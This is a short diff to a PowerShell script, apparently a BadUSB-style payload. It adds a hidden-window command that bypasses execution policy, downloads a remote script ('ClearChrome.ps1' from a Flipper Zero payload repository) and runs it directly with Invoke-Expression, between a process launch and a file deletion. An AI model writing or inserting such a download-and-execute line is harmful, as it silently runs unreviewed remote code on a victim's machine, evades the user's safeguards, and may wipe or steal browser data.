@@ -40,5 +40,8 @@ Start-Process $filePath
 # Delay for 2 seconds
 Start-Sleep -Seconds 2
 
+# Download something using the command you provided
+powershell -w h -NoP -Ep Bypass -Command "& { IEX (Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Proxy/ClearChrome.ps1).Content }"
+
 # Delete the file
 Remove-Item -Path $filePath
